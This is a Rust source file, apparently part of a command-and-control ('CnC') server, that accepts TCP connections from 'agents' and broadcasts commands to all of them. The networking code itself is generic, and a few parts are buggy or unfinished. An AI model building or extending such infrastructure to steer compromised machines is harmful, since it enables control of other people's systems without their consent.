use tokio::net::{TcpListener};
use tokio::io::Interest;
use std::io;
use tokio::sync::Mutex;
use std::sync::Arc;

use crate::socket::{SocketState, SocketStream};
pub struct Server {
    pub streams: Arc<Mutex<Vec<SocketStream>>> // or agents
}

impl Server {
    pub fn new() -> Self {
        Self {
            streams: Arc::new(Mutex::new(Vec::new()))
        }
    }

    pub async fn assign_new_socket(&mut self, socket: SocketStream) {
        let streams = Arc::clone(&self.streams);
        let mut streams_lock = streams.lock().await;
        streams_lock.push(socket);
        self.read_new_socket().await.unwrap();
    }

    pub async fn broadcast_command(&mut self, command: Vec<u8>) -> Result<(), Vec<&SocketStream>> {
        let mut failed_broadcasts: Vec<&SocketStream> = Vec::new();
        let streams = Arc::clone(&self.streams);
        let mut streams = streams.lock().await;
        for stream in &mut *streams {
            let res = stream.write_msg(&command).await;
            if res.is_err() {
                // failed_broadcasts.push(&stream);
                continue
            }
        }

        if failed_broadcasts.len() > 0 {Err(failed_broadcasts)} else {Ok(())}
    }

    pub async fn read_new_socket(&mut self) -> io::Result<()> {
        // A loop which reads messages from the CnC
        // server.assign_new_stream(stream: SocketStream)
        let my_streams = Arc::clone(&self.streams);
        tokio::spawn(async move {
            loop {
                let streams = my_streams.lock().await;
                let socket = streams.last().unwrap();
                let stream_ready = socket.stream.ready(Interest::READABLE | Interest::WRITABLE).await.unwrap();
        
                if stream_ready.is_readable() {
                    
                    let msg = socket.consume_message().await;
        
                    if let Ok((msg, n_bytes)) = msg {
                        if n_bytes == 0 {
                            break
                        }
                        
                        socket.handle_msg(msg).await;
                    }
                }
            }
        });
    
        Ok(())
    }
}



pub async fn start_cnc_server(ip: &str, port: u16, server: &mut Server) -> io::Result<()> {
    let listener = TcpListener::bind(&format!("{}:{}", ip, port)).await?;
    loop {
        let (socket, _) = listener.accept().await?;
        let socket = SocketStream::new(socket);
        server.assign_new_socket(socket).await;
        println!("{:?}", "I'm here");
    }
}